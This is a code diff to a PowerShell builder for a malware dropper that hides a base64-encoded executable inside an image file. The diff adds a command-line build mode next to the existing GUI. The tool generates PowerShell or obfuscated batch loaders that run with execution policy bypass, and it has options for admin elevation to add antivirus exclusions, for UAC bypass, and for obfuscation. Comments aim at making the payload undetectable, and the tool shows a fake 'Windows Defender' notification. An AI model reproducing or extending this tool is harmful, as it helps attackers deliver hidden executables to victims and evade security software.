@@ -1,3 +1,20 @@
+param(
+    [cmdletbinding()]
+    [Parameter(Mandatory=$false)]
+    [string]$image,
+    [Parameter(Mandatory=$false)]
+    [string]$exe,
+    [Parameter(Mandatory=$false)]
+    [string]$type,
+    [Parameter(Mandatory=$false)]
+    [string]$obf
+)
+
+if ($image -eq '/?') {
+    Write-Host 'Usage: builder.ps1 "[IMAGE_PATH]" "[EXE_PATH]" "[TYPE (ps1/bat)]" [OBFUSCATION (true/false)]' -ForegroundColor Yellow
+    break
+}
+
 Add-Type -AssemblyName PresentationFramework
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -Name Window -Namespace Console -MemberDefinition '
@@ -354,80 +371,176 @@ function build {
     Show-Notification "Windows Defender" "Payload created in $working_dir\output lmao u prolly thought this was a virus warning (skull emoji)"
 }
 
-$image_name = "comethazine.png"
-$icon_name = "logo.ico" # doesn't even work smh
-$working_dir = Get-Location
-$image_name_path = "$working_dir\assets\$image_name"
-$icon_name_path = "$working_dir\assets\$icon_name"
-$inputXML = $inputXML -replace 'mc:Ignorable="d"', '' -replace "x:N", 'N' -replace '^<Win.*', '<Window' -replace 'comethazine.png', $image_name_path -replace 'logo.ico', $icon_name_path
-[XML]$XAML = $inputXML
 
-$reader = (New-Object System.Xml.XmlNodeReader $xaml)
-try {
-    $window = [Windows.Markup.XamlReader]::Load( $reader )
-} catch {
-    Write-Warning $_.Exception
-    throw
-}
+function Invoke-UI {
+    $image_name = "comethazine.png"
+    $icon_name = "logo.ico" # doesn't even work smh
+    $working_dir = Get-Location
+    $image_name_path = "$working_dir\assets\$image_name"
+    $icon_name_path = "$working_dir\assets\$icon_name"
+    $inputXML = $inputXML -replace 'mc:Ignorable="d"', '' -replace "x:N", 'N' -replace '^<Win.*', '<Window' -replace 'comethazine.png', $image_name_path -replace 'logo.ico', $icon_name_path
+    [XML]$XAML = $inputXML
 
-$Window.add_Loaded({
-    $Window.Icon = $icon_name_path
-})
-
-$xaml.SelectNodes("//*[@Name]") | ForEach-Object {
+    $reader = (New-Object System.Xml.XmlNodeReader $xaml)
     try {
-        Set-Variable -Name "var_$($_.Name)" -Value $window.FindName($_.Name) -ErrorAction SilentlyContinue
+        $window = [Windows.Markup.XamlReader]::Load( $reader )
     } catch {
-        $null
+        Write-Warning $_.Exception
+        throw
     }
+
+    $Window.add_Loaded({
+        $Window.Icon = $icon_name_path
+    })
+
+    $xaml.SelectNodes("//*[@Name]") | ForEach-Object {
+        try {
+            Set-Variable -Name "var_$($_.Name)" -Value $window.FindName($_.Name) -ErrorAction SilentlyContinue
+        } catch {
+            $null
+        }
+    }
+    Get-Variable var_* > $null
+    $FileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{ InitialDirectory = [Environment]::GetFolderPath('Desktop') }
+
+    $var_FIND_IMAGE.add_Click({
+        $location = $FileBrowser.ShowDialog()
+        if ($location -eq 'OK') {
+            if ($FileBrowser.FileName -notmatch '\.(jpg|jpeg|png|bmp)$') {
+                [System.Windows.MessageBox]::Show("File must be an image", "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
+                return
+            } else {
+                $var_IMAGE_PATH_SHOW.Text = $FileBrowser.FileName
+            }
+        }
+    })
+    
+    $var_FIND_EXE.add_Click({
+        $location = $FileBrowser.ShowDialog()
+        if ($location -eq 'OK') {
+            if ($FileBrowser.FileName -notmatch '\.exe$') {
+                [System.Windows.MessageBox]::Show("File must be an exe", "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
+                return
+            } else {
+                $var_EXE_PATH_SHOW.Text = $FileBrowser.FileName
+            }
+        }
+    })
+    
+    $var_ps1_button.add_Click({
+        if ($var_IMAGE_PATH_SHOW.Text -eq '' -or $var_EXE_PATH_SHOW.Text -eq '') {
+            [System.Windows.MessageBox]::Show("Please select an image and exe", "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
+            return
+        } else {
+            build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text -type 'ps1'
+            $var_OUTPUT_BOX.Text += "PS1 Built`n"
+        }
+    })
+    
+    $var_Bat_Button.add_Click({
+        if ($var_IMAGE_PATH_SHOW.Text -eq '' -or $var_EXE_PATH_SHOW.Text -eq '') {
+            [System.Windows.MessageBox]::Show("Please select an image and exe", "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
+            return
+        } else {
+            build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text -type 'bat'
+            $var_OUTPUT_BOX.Text += "BAT Built`n"
+        }
+    })
+    
+    $var_OUTPUT_BOX.add_TextChanged({
+        $var_OUTPUT_BOX.ScrollToEnd()
+    })
+
+    $var_OUTPUT_BOX.Text += "Successfully Started`n"
+    Remove-Item -Path .\output\payload.ps1 -Force -ErrorAction SilentlyContinue
+    Hide-Console #Makes it look nice
+    #If you don't want UAC admin to be required when running the payload set this to $false
+    $uac_required = $true #This makes it so when they run the bat or ps1 file it requires them to run as admin. This is important because runtime the dropper sometimes won't be fud but this will add it as a exclusion.
+    $uac_BYPASS = $false #If this is true then the generated script will try and bypass uac admin. If it is false then it will just require admin if $uac_required is true otherwise it will use normal script.
+    if ($uac_required -eq $True) {
+        $EMBEDDED_CODE = $EMBEDDED_CODE_ADMIN
+    }
+    if ($uac_BYPASS -eq $True) {
+        $EMBEDDED_CODE = $EMBEDDED_CODE_ADMIN_UAC_BYPASS
+    }
+    $Null = $window.ShowDialog()
 }
-Get-Variable var_* > $null
-$FileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{ InitialDirectory = [Environment]::GetFolderPath('Desktop') }
 
-$var_FIND_IMAGE.add_Click({
-    $location = $FileBrowser.ShowDialog()
-    if ($location -eq 'OK') {
-        if ($FileBrowser.FileName -notmatch '\.(jpg|jpeg|png|bmp)$') {
-            throw "Image must be a jpg, jpeg, png, or bmp"
+function Invoke-BuildNoUI {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$image,
+        [Parameter(Mandatory=$true)]
+        [string]$exe,
+        [Parameter(Mandatory=$true)]
+        [string]$type,
+        [Parameter(Mandatory=$true)]
+        [string]$obf_no_ui
+    )
+    New-Item -ItemType Directory -Path "output" -Force > $null
+    $working_dir = Get-Location
+    $image_name = Split-Path $image -Leaf
+    Write-Host "Building $type file..."
+    Write-Host "Reading exe bytes..."
+    $exe_bytes = [System.IO.File]::ReadAllBytes($exe)
+    Write-Host "Converting exe bytes to base64..."
+    $exe_base64 = [System.Convert]::ToBase64String($exe_bytes)
+    Write-Host "Converting base64 to bytes..."
+    $exe_base64_bytes = [System.Text.Encoding]::ASCII.GetBytes($exe_base64)
+    Write-Host "Reading image bytes..."
+    $image_bytes = [System.IO.File]::ReadAllBytes($image)
+    Write-Host "Writing image bytes to file..."
+    $newLine = [System.Text.Encoding]::ASCII.GetBytes([Environment]::NewLine)
+    Write-Host "Writing exe bytes to file..."
+    $combined_bytes = $image_bytes + $newLine + $exe_base64_bytes
+    Write-Host "Writing combined bytes to file..."
+    [System.IO.File]::WriteAllBytes("$working_dir\output\$image_name", $combined_bytes)
+    Write-Host "Writing payload to file..."
+    $EMBEDDED_CODE = $EMBEDDED_CODE.Replace("test_image.jpg", $image_name)
+    $EMBEDDED_CODE | Out-File -Encoding ASCII "$working_dir\output\payload.ps1"
+
+    if ($type -eq "bat") {
+        Write-Host "No Obfuscation..."
+    } else {
+        if ($obf_no_ui -ne $true) {
+            Write-Host "No Obfuscation..."
+        } else {
+            Write-Host "Obfuscating..."
+            Invoke-obfuscate -inputFile "$working_dir\output\payload.ps1" -outputFile "$working_dir\output\payload.ps1"
         }
-        $var_IMAGE_PATH_SHOW.Text = $FileBrowser.FileName
     }
-})
 
-$var_FIND_EXE.add_Click({
-    $location = $FileBrowser.ShowDialog()
-    if ($location -eq 'OK') {
-        if ($FileBrowser.FileName -notmatch '\.exe$') {
-            throw "File must be an exe"
+    if ($type -eq "bat") {
+        Write-Host "Obfuscating batch code..."
+        $ps1_code = $EMBEDDED_CODE.Split("")
+        foreach ($line in $ps1_code) {
+            #show progress in output box
+            Write-Host "Obfuscating line: $line"
+            if ($line -eq "") {
+                continue
+            }
+            $line_split = $line.Replace("", "")
+            $line_split = $line_split.Replace("`r", "")
+            $line = "echo " + $line_split + " >> payload.ps1"
+            $line = Invoke-obfuscate $line
+            Add-Content -Path .\output\payload.bat -Value $line
         }
-        $var_EXE_PATH_SHOW.Text = $FileBrowser.FileName
+        $str_obf = "powershell.exe -ExecutionPolicy Bypass -File .\payload.ps1"
+        $str_obf = Invoke-obfuscate $str_obf
+        Write-Host "Writing obfuscated batch code to file..."
+        Add-Content -Path .\output\payload.bat -Value $str_obf
+        Write-Host "Payload.bat created in $working_dir\output "
+        Write-Host "Cleaning up..."
+        Remove-Item -Path .\output\payload.ps1 -Force
     }
-})
-
-$var_ps1_button.add_Click({
-    if ($var_IMAGE_PATH_SHOW.Text -eq '' -or $var_EXE_PATH_SHOW.Text -eq '') {
-        throw "Please select an image and exe"
+    else {
+        Write-Host "Payload.ps1 created in $working_dir\output "
     }
-    build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text -type 'ps1'
-    $var_OUTPUT_BOX.Text += "PS1 Built`n"
-})
+    #set color to green in text box
+    Write-Host "Done!"
+    Show-Notification "Windows Defender" "Payload created in $working_dir\output lmao u prolly thought this was a virus warning (skull emoji)"
+}
 
-$var_Bat_Button.add_Click({
-    if ($var_IMAGE_PATH_SHOW.Text -eq '' -or $var_EXE_PATH_SHOW.Text -eq '') {
-        throw "Please select an image and exe"
-    }
-    build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text -type 'bat'
-    $var_OUTPUT_BOX.Text += "BAT Built`n"
-})
-
-$var_OUTPUT_BOX.add_TextChanged({
-    $var_OUTPUT_BOX.ScrollToEnd()
-})
-
-$var_OUTPUT_BOX.Text += "Successfully Started`n"
-Remove-Item -Path .\output\payload.ps1 -Force -ErrorAction SilentlyContinue
-Hide-Console #Makes it look nice
-#If you don't want UAC admin to be required when running the payload set this to $false
 $uac_required = $true #This makes it so when they run the bat or ps1 file it requires them to run as admin. This is important because runtime the dropper sometimes won't be fud but this will add it as a exclusion.
 $uac_BYPASS = $false #If this is true then the generated script will try and bypass uac admin. If it is false then it will just require admin if $uac_required is true otherwise it will use normal script.
 if ($uac_required -eq $True) {
@@ -436,4 +549,9 @@ if ($uac_required -eq $True) {
 if ($uac_BYPASS -eq $True) {
     $EMBEDDED_CODE = $EMBEDDED_CODE_ADMIN_UAC_BYPASS
 }
-$Null = $window.ShowDialog()
+
+if ($image -and $exe -and $type -and $obf) {
+    Invoke-BuildNoUI -image $image -exe $exe -type $type -obf_no_ui $obf
+} else {
+    Invoke-UI
+}
